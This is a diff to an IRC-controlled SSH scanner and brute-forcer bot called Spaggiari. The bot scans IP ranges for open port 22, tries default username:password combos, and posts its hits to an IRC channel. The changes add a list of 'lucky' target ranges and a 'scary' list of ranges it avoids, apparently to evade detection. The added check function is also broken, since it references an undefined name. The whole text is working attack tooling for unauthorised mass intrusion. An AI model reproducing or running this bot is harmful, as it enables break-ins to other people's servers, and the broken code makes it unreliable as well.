@@ -2,7 +2,7 @@
 # Spaggiari Scanner - Version 1.0b
 # A Secure Shell (SSH) scanner / bruteforcer controlled via the Internet Relay Chat (IRC) protocol.
 # Developed by acidvegas in Python 2.7
-# https://github.com/acidvegas/spaggiari
+# https://github.com/acidvegas/spaggiari/
 # spaggiari.py
 
 """
@@ -17,13 +17,13 @@ Commands:
  - @info      | Information about the server.
  - @kill      | Kill the bot.
  - @scan      | Scan every in IP address in the range arguments.
- - @status    | Check the scanning status on thr bot.
+ - @status    | Check the scanning status on the bot.
  - @stop      | Stop all current running scans.
  - @version   | Information about the scanner.
 
  Todo:
- - Fix up the @scan and @stop commands.
- - Add bad ip range blocklist.
+- Fix up the @scan and @stop commands.
+- Add bad ip range blocklist.
 """
 
 import datetime
@@ -40,7 +40,7 @@ import time
 import urllib2
 
 # IRC Config
-server   = 'irc.server.org'
+server   = 'irc.server.com'
 port     = 6697
 use_ssl  = True
 password = None
@@ -80,7 +80,9 @@ combos = [
     'vyos:vyos'
 ]
 
-lucky = ['113.53','117.156','118.173','118.174','122.168','122.176','165.229','177.11','182.74','186.113','186.114','186.115','186.119','187.109','188.59','190.252','190.253','190.254','190.255','190.65','190.66','190.67','190.68','190.69','201.75','203.249','31.176','60.51','84.122''95.169','95.6','95.9']
+# Important Ranges
+lucky = ['113.53','117.156','118.173','118.174','122.168','122.176','165.229','177.11','182.74','186.113','186.114','186.115','186.119','187.109','188.59','190.252','190.253','190.254','190.255','190.65','190.66','190.67','190.68','190.69','201.75','31.176','60.51','84.122','95.169','95.6','95.9']
+scary = ['11','21','22','24','25','26','29','49','50','55','62','64','128','129','130','131','132','134','136','137','138','139','140','143','144','146','147','148','150','152','153','155','156','157','158','159','161','162','163','164','167','168','169','194','195','199','203','204','205','207','208','209','212','213','216','217','6','7']
 
 # Formatting Control Characters
 bold        = '\x02'
@@ -187,6 +189,19 @@ def check_port(ip, port):
     finally:
         sock.close()
 
+def check_spooky(targets):
+    breaker = False
+    found   = False
+    for ip in targets:
+        if breaker:
+            found = True
+            break
+        for spooky_range in spooky:
+            if ip.split('.')[0] == spooky_range:
+                breaker = True
+                break
+    return found
+
 def color(msg, foreground, background=None):
     if background : return '%s%s,%s%s%s' % (colour, foreground, background, msg, reset)
     else          : return '%s%s%s%s'    % (colour, foreground, msg, reset)
@@ -214,8 +229,8 @@ class ssh_bruteforce(threading.Thread):
         threading.Thread.__init__(self)
     def run(self):
         if check_port(self.host, 22):
-            alert('%s has port 22 open. (ssh)' % self.host)
-            SpaggiariBot.sendmsg(channel, '[%s] - %s has port 22 open. %s' % (color('+', green), self.host, color('(ssh)', grey)))
+            alert('%s has port 22 open.' % self.host)
+            SpaggiariBot.sendmsg(channel, '[%s] - %s has port 22 open.' % (color('+', green), self.host))
             for item in combos:
                 user   = item.split(':')[0]
                 passwd = item.split(':')[1]
@@ -242,7 +257,7 @@ class ssh_bruteforce(threading.Thread):
                     ssh.close()
                 time.sleep(throttle)
         else:
-            error('%s does not have port 22 open. (ssh)' % self.host)
+            error('%s does not have port 22 open.' % self.host)
 
 def scan(ip_range):
     for ip in ip_range:
@@ -352,9 +367,12 @@ class IRC(object):
                             end   = args[3]
                         if check_ip(start) and check_ip(end):
                             targets = ip_range(start, end)
-                            self.sendmsg(chan, '[%s] - Scanning %s IP addresses in range...' % (color('#', blue), '{:,}'.format(len(targets))))
-                            scan(targets)
-                            self.sendmsg(chan, '[%s] - Scan has completed. %s' % (color('#', blue), color('(Threads still may be running.)', grey)))
+                            if not check_spooky(targets):
+                                self.sendmsg(chan, '[%s] - Scanning %s IP addresses in range...' % (color('#', blue), '{:,}'.format(len(targets))))
+                                scan(targets)
+                                self.sendmsg(chan, '[%s] - Scan has completed. %s' % (color('#', blue), color('(Threads still may be running.)', grey)))
+                            else:
+                                self.sendmsg(chan, '[%s] - Spooky IP address range.' % color('ERROR', red))
                         else:
                             self.sendmsg(chan, '[%s] - Invalid IP address range.' % color('ERROR', red))
                     else:
